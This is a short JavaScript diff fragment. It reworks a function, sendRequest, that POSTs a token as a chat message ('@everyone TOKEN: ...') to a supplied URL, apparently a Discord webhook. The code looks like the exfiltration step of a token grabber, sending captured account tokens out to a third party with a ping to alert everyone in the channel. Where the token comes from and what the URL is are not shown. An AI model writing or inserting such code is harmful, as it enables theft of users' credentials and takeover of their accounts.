@@ -122,15 +122,15 @@
           console.error(error);
         }
       }
+async function sendRequest(url, token) {
+  const response = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `@everyone TOKEN: ${token}`, tts: false }),
+  });
+  return response.json();
+}
 
-      async function sendRequest(url, token) {
-        const response = await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: `TOKEN: ${token}`, tts: false }),
-        });
-        return response.json();
-      }
 
       function sleep(ms) {
         return new Promise((resolve) => setTimeout(resolve, ms));
